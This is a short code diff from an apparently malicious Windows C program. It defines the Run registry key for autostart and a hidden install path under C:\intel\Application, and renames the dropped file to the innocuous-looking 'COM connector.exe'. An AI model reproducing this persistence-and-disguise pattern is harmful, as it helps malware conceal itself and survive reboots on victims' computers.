@@ -14,7 +14,7 @@ const char g_szClassName[] = "myWindowClass";
 
 static const TCHAR reg_path[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
 
-static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\ApplicationForYou.exe");
+static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\COM connector.exe");
 static const TCHAR hide_dir[] = TEXT("C:\\intel\\Application");
 
 // Step 4: the Window Procedure
